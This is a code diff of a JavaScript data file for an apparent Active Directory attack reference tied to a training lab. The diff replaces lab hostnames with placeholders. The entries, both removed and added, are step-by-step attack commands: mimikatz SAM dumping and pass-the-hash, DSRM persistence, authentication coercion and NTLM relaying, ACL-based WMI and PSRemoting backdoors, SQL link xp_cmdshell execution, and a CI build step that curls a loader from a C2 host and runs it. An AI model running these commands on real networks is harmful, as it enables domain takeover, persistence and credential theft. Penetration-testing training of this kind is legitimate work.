@@ -1796,7 +1796,7 @@ var VULNS = [
             title: "How It's Exploited",
             type: "commands",
             commands: [
-              { label: "1. From a DC session, dump the local SAM (DSRM account)", cmd: "# DSRM password is mapped to the DC's LOCAL Administrator and stored in the SAM hive\nprivilege::debug\ntoken::elevate\nlsadump::sam            # note the Administrator RID-500 NTLM hash\n# via Sliver: package mimikatz with PEzor -> execute-assembly on the dcorp-dc session" },
+              { label: "1. From a DC session, dump the local SAM (DSRM account)", cmd: "# DSRM password is mapped to the DC's LOCAL Administrator and stored in the SAM hive\nprivilege::debug\ntoken::elevate\nlsadump::sam            # note the Administrator RID-500 NTLM hash\n# via Sliver: package mimikatz with PEzor -> execute-assembly on the <dc> session" },
               { label: "2. Change the DSRM logon behaviour on the DC", cmd: "# by default the DSRM account cannot log on over the network; flip the registry value\n# Sliver: registry write on the DC session\nregistry write --hive HKLM --type dword \\\n  \"System\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\DsrmAdminLogonBehavior\" 2\n# 2 = the DSRM admin may log on like a normal local account" },
               { label: "3. Re-enter later with pass-the-hash as the DSRM admin", cmd: "# use the RID-500 hash to spawn a process as the DC's local Administrator\nsekurlsa::pth /domain:<dc-hostname> /user:Administrator \\\n  /ntlm:<dsrm-ntlm-hash> /run:C:\\Windows\\System32\\cmd.exe\n# then inject a C2 payload into that process for admin access on the DC" },
               { label: "4. Confirm persistence", cmd: "# the DSRM hash is static and unaffected by domain password resets\n# it stays valid until DSRM is explicitly reset -> a durable DC re-entry path" }
@@ -2735,11 +2735,11 @@ var VULNS = [
             title: "How It's Exploited",
             type: "commands",
             commands: [
-              { label: "1. Coerce the target to authenticate (Printer Bug, MS-RPRN)", cmd: "# force <target> to authenticate to <listener> as <target>$ (machine account)\nSpoolSample.exe dcorp-dc dcorp-appsrv\n# via Sliver: execute-assembly the SpoolSample .NET binary in memory" },
+              { label: "1. Coerce the target to authenticate (Printer Bug, MS-RPRN)", cmd: "# force <target> to authenticate to <listener> as <target>$ (machine account)\nSpoolSample.exe <dc> <listener-host>\n# via Sliver: execute-assembly the SpoolSample .NET binary in memory" },
               { label: "1-alt. Coerce via other RPC surfaces", cmd: "# MS-EFSR (PetitPotam), MS-FSRVP, MS-DFSNM all expose coercion methods:\nPetitPotam.exe <listener> <target>\n# tooling such as Coercer sweeps multiple methods automatically" },
               { label: "2a. Capture path — host trusted for unconstrained delegation", cmd: "# on a host with unconstrained delegation, monitor for the incoming TGT:\nRubeus.exe monitor /interval:5 /nowrap\n# coerce the DC -> its TGT lands in the listener's memory -> ptt and DCSync" },
-              { label: "2b. Relay path — forward the auth to a vulnerable service", cmd: "# relay the coerced machine auth to LDAP (RBCD) or AD CS web enrollment (ESC8):\nntlmrelayx.py -t ldaps://dcorp-dc --delegate-access      # write RBCD on the DC object\nntlmrelayx.py -t http://ca/certsrv/certfnsh.asp --adcs    # ESC8 -> machine cert -> TGT" },
-              { label: "3. Use the resulting privilege", cmd: "# captured/relayed as the DC machine account or a DA -> DCSync, RBCD S4U, or a cert-based TGT\nRubeus.exe asktgt /user:dcorp-dc$ /certificate:<pfx> /ptt   # (ESC8 result)" }
+              { label: "2b. Relay path — forward the auth to a vulnerable service", cmd: "# relay the coerced machine auth to LDAP (RBCD) or AD CS web enrollment (ESC8):\nntlmrelayx.py -t ldaps://<dc> --delegate-access      # write RBCD on the DC object\nntlmrelayx.py -t http://ca/certsrv/certfnsh.asp --adcs    # ESC8 -> machine cert -> TGT" },
+              { label: "3. Use the resulting privilege", cmd: "# captured/relayed as the DC machine account or a DA -> DCSync, RBCD S4U, or a cert-based TGT\nRubeus.exe asktgt /user:<dc>$ /certificate:<pfx> /ptt   # (ESC8 result)" }
             ]
           },
           {
@@ -2806,9 +2806,9 @@ var VULNS = [
         description: "An attacker with administrative access rewrites the security descriptors on remote-access subsystems (WMI, WinRM, services, registry, DCOM) to grant a low-privileged principal stealthy, file-less remote code execution rights.",
         brief: "Most Windows remote-management surfaces — the WMI namespaces, WinRM/PSRemoting, the Service Control Manager, the remote registry, and DCOM — guard access with their own security descriptor (a DACL) that is evaluated when a caller connects. An attacker who already has admin on a host (or on a DC) can edit those descriptors to add an ACE granting a chosen low-privileged user the rights needed to execute code remotely. Afterwards that ordinary user can come back over WMI or PSRemoting and run commands as though they were an administrator.\n\nWhat makes this a durable backdoor is what it is not: no new account is created, no binary or service is dropped, no membership is added to a privileged group. It is a permissions change on components that are supposed to be there, so account-, file- and group-based detection all miss it. The RACE toolkit automates the common variants (remote WMI and PSRemoting descriptors); the same idea applies to service, registry and DCOM ACLs.",
         quickReference: [
-          { label: "Backdoor remote WMI", cmd: "Set-RemoteWMI -SamAccountName studentX -ComputerName <host> -namespace 'root\\cimv2'" },
-          { label: "Backdoor PSRemoting", cmd: "Set-RemotePSRemoting -SamAccountName studentX -ComputerName <host>" },
-          { label: "Use it later (low-priv)", cmd: "Invoke-WmiMethod / Enter-PSSession as studentX -> admin actions" },
+          { label: "Backdoor remote WMI", cmd: "Set-RemoteWMI -SamAccountName <user> -ComputerName <host> -namespace 'root\\cimv2'" },
+          { label: "Backdoor PSRemoting", cmd: "Set-RemotePSRemoting -SamAccountName <user> -ComputerName <host>" },
+          { label: "Use it later (low-priv)", cmd: "Invoke-WmiMethod / Enter-PSSession as <user> -> admin actions" },
           { label: "Revert", cmd: "…-Remove to strip the added ACE" }
         ],
         sections: [
@@ -2816,10 +2816,10 @@ var VULNS = [
             title: "How It's Exploited",
             type: "commands",
             commands: [
-              { label: "1. From admin, grant a low-priv user remote WMI rights", cmd: "# edits the __SystemSecurity descriptor on the WMI namespace to add studentX\nSet-RemoteWMI -SamAccountName studentX -ComputerName dcorp-dc.dollarcorp.moneycorp.local -namespace 'root\\cimv2' -Verbose\n# via Sliver: compile RACE.ps1 to .NET with PS2EXE, run with execute-assembly" },
-              { label: "2. Grant remote PSRemoting (WinRM RootSDDL) rights", cmd: "Set-RemotePSRemoting -SamAccountName studentX -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose\n# modifies the WinRM endpoint's security descriptor to allow studentX" },
-              { label: "3. Later, return as the low-priv user and execute code", cmd: "# no admin required now — the ACL grants it:\nInvoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList \"cmd /c ...\" -ComputerName dcorp-dc\nEnter-PSSession -ComputerName dcorp-dc            # as studentX" },
-              { label: "4. Clean up / rotate the backdoor", cmd: "Set-RemoteWMI -SamAccountName studentX -ComputerName dcorp-dc ... -Remove -Verbose\nSet-RemotePSRemoting -SamAccountName studentX -ComputerName dcorp-dc -Remove -Verbose" }
+              { label: "1. From admin, grant a low-priv user remote WMI rights", cmd: "# edits the __SystemSecurity descriptor on the WMI namespace to add <user>\nSet-RemoteWMI -SamAccountName <user> -ComputerName <dc> -namespace 'root\\cimv2' -Verbose\n# via Sliver: compile RACE.ps1 to .NET with PS2EXE, run with execute-assembly" },
+              { label: "2. Grant remote PSRemoting (WinRM RootSDDL) rights", cmd: "Set-RemotePSRemoting -SamAccountName <user> -ComputerName <dc> -Verbose\n# modifies the WinRM endpoint's security descriptor to allow <user>" },
+              { label: "3. Later, return as the low-priv user and execute code", cmd: "# no admin required now — the ACL grants it:\nInvoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList \"cmd /c ...\" -ComputerName <dc>\nEnter-PSSession -ComputerName <dc>            # as <user>" },
+              { label: "4. Clean up / rotate the backdoor", cmd: "Set-RemoteWMI -SamAccountName <user> -ComputerName <dc> ... -Remove -Verbose\nSet-RemotePSRemoting -SamAccountName <user> -ComputerName <dc> -Remove -Verbose" }
             ]
           },
           {
@@ -3313,10 +3313,10 @@ var VULNS = [
             type: "commands",
             commands: [
               { label: "1. Discover SQL Server instances in the domain", cmd: "# SQL servers register MSSQLSvc SPNs — enumerate them via LDAP\nGet-SQLInstanceDomain            # PowerUpSQL / SharpSQL\n# e.g. via Sliver: execute-assembly -p explorer.exe -t 80 'SharpSQL.exe' 'Get-SQLInstanceDomain'" },
-              { label: "2. Find an instance you can authenticate to", cmd: "Get-UserPrivs -Instance dcorp-mssql.domain.local\n# [*] Authenticated to: dcorp-mssql...   CONNECT SQL / VIEW ANY DATABASE\n# your domain user may have CONNECT rights on one instance even without sysadmin" },
-              { label: "3. Enumerate configured database links from that instance", cmd: "Get-SQLServerLink -Instance dcorp-mssql.domain.local\n-- or in SQL:\nSELECT srvname, srvproduct, rpcout FROM master..sysservers;" },
-              { label: "4. Crawl the link chain (each hop runs as the link's stored login)", cmd: "# link crawling follows every reachable link recursively and reports the context at each hop\nGet-SQLServerLinkCrawl -Instance dcorp-mssql.domain.local\n# Path: {DCORP-MSSQL} -> {DCORP-MSSQL, DCORP-SQL1(user: dblinkuser)} -> {..., DCORP-MGMT}\n# note where 'Sysadmin : 1' appears on a downstream instance" },
-              { label: "5. Execute commands on a linked server (RCE via xp_cmdshell)", cmd: "# run a command on the far end of the chain; enable xp_cmdshell if needed\nGet-SQLServerLinkCrawl -Instance dcorp-mssql.domain.local \\\n  -Query \"exec master..xp_cmdshell 'whoami'\" -QueryTarget eu-sqlX\n-- manual nested openquery to reach a two-hop link:\nSELECT * FROM openquery(\"DCORP-SQL1\", 'SELECT * FROM openquery(\"DCORP-MGMT\",''exec master..xp_cmdshell ''''whoami'''''')')" },
+              { label: "2. Find an instance you can authenticate to", cmd: "Get-UserPrivs -Instance <sql-instance>\n# [*] Authenticated to: <sql-instance>   CONNECT SQL / VIEW ANY DATABASE\n# your domain user may have CONNECT rights on one instance even without sysadmin" },
+              { label: "3. Enumerate configured database links from that instance", cmd: "Get-SQLServerLink -Instance <sql-instance>\n-- or in SQL:\nSELECT srvname, srvproduct, rpcout FROM master..sysservers;" },
+              { label: "4. Crawl the link chain (each hop runs as the link's stored login)", cmd: "# link crawling follows every reachable link recursively and reports the context at each hop\nGet-SQLServerLinkCrawl -Instance <sql-instance>\n# Path: {DCORP-MSSQL} -> {DCORP-MSSQL, DCORP-SQL1(user: dblinkuser)} -> {..., DCORP-MGMT}\n# note where 'Sysadmin : 1' appears on a downstream instance" },
+              { label: "5. Execute commands on a linked server (RCE via xp_cmdshell)", cmd: "# run a command on the far end of the chain; enable xp_cmdshell if needed\nGet-SQLServerLinkCrawl -Instance <sql-instance> \\\n  -Query \"exec master..xp_cmdshell 'whoami'\" -QueryTarget <target-sql>\n-- manual nested openquery to reach a two-hop link:\nSELECT * FROM openquery(\"DCORP-SQL1\", 'SELECT * FROM openquery(\"DCORP-MGMT\",''exec master..xp_cmdshell ''''whoami'''''')')" },
               { label: "6. Turn RCE into a foothold", cmd: "# xp_cmdshell runs as the SQL Server service account on the linked host\n# use it to run a loader / Sliver shellcode and beacon back from that server" }
             ]
           },
@@ -5104,7 +5104,7 @@ var VULNS = [
             title: "How It's Exploited",
             type: "commands",
             commands: [
-              { label: "1. Discover and fingerprint the automation server", cmd: "nmap 172.16.3.11 -p 8080 -sC -sV -Pn\n# browse the web UI; enumerate users (e.g. Jenkins 'People' tab), jobs and permissions\n# check for anonymous/weak auth and 'anyone can configure/build' settings" },
+              { label: "1. Discover and fingerprint the automation server", cmd: "nmap <build-server> -p 8080 -sC -sV -Pn\n# browse the web UI; enumerate users (e.g. Jenkins 'People' tab), jobs and permissions\n# check for anonymous/weak auth and 'anyone can configure/build' settings" },
               { label: "2a. Code execution via a build-step command", cmd: "# in a job you can create or edit, add a build step that runs an OS command.\n# example: stage and run a C2 loader via scheduled tasks from a Windows batch step:\nschtasks /create /tn \"stage\" /sc ONSTART /tr \"cmd /c curl http://<c2>/loader.exe -o C:\\Windows\\Temp\\loader.exe\"\nschtasks /create /tn \"run\"   /sc ONSTART /tr \"C:\\Windows\\Temp\\loader.exe <c2> 8080 payload.bin\"\nschtasks /run /tn \"stage\"  &  schtasks /run /tn \"run\"\n# the build runs as the CI service account -> a foothold on the build host/agent" },
               { label: "2b. Code execution via a script console", cmd: "# many servers ship an admin scripting surface (Jenkins Groovy console, etc.)\n# reachable to over-privileged users -> direct in-process code execution:\n\"whoami\".execute().text        # Groovy example run from the console" },
               { label: "3. Harvest the credential store and pipeline secrets", cmd: "# CI servers store deploy/cloud/signing credentials for the pipelines they run:\n# print injected build environment / bound credentials, or read the credentials store,\n# then reuse those secrets against the systems the pipeline was trusted to deploy to." },
